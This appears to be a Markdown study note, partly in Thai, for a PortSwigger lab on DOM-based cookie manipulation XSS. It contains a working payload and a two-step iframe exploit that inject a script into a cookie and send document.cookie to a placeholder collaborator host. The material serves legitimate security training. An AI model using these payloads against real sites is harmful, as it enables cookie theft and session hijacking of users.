# Pattern 7: DOM-based Cookie Manipulation
> [Back to Index](../README.md) | [Previous: Reflected eval](pattern-6-reflected-eval.md)

---

## Overview

**Source:** Cookie value (`lastViewedProduct`)
**Sink:** `document.write()` or similar
**Special:** Cookie set from URL

---

## วิธี Identify

```javascript
// หาใน source code
var lastViewed = document.cookie.match(/lastViewedProduct=([^;]+)/);
document.write('<a href="' + lastViewed + '">Last viewed</a>');
```

**สิ่งที่ต้องหา:**
- Cookie ชื่อ `lastViewedProduct` หรือคล้ายกัน
- Cookie ถูก set จาก URL ที่เราควบคุมได้
- Cookie value ถูกนำไป render

---

## Cookie Setting Flow

```
1. User เข้าหน้า /product?productId=1
         ↓
2. JavaScript set cookie:
   lastViewedProduct = "/product?productId=1"
         ↓
3. หน้าอื่นอ่าน cookie → render
```

---

## Payload

```
/product?productId=1&'><script>fetch('https://COLLABORATOR?c='+document.cookie)</script>
```

**หมายเหตุ:** document.location ต้องไม่ URL encode

---

## Exploit (2-step)

```html
<iframe src="https://TARGET.net/product?productId=1&'><script>fetch('https://COLLABORATOR?c='%2bdocument.cookie)</script>"
        onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
</iframe>
```

**Breakdown:**
1. iframe โหลด URL พร้อม payload → cookie ถูก set
2. onload ทำงาน → เปลี่ยน src ไปหน้าที่อ่าน cookie
3. หน้าใหม่ render cookie → XSS execute

---

## Why 2 Requests?

```
Request 1: Set malicious cookie
         ↓
Request 2: Render cookie (XSS triggers)
```

---

## Checklist

```
✓ หา cookie ที่ set จาก URL
✓ หา code ที่อ่านและ render cookie
✓ ทดสอบ escape ด้วย '> หรือ ">
✓ ไม่ URL encode payload ใน cookie
✓ ใช้ 2-step iframe exploit
```

---

## Lab Reference
- [PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

---

> **Next:** [pattern-8-jquery-hashchange.md](pattern-8-jquery-hashchange.md)
